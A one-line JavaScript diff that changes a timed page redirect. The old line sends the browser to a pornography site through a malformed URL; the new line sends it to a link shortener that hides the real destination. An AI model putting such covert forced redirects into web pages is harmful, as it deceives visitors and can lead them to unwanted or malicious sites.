@@ -1,1 +1,1 @@
-setTimeout(() => window.location.replace("https://https://es.pornhub.com/"), 3000);
+setTimeout(() => window.location.replace("https://is.gd/OcWorG"), 3000);
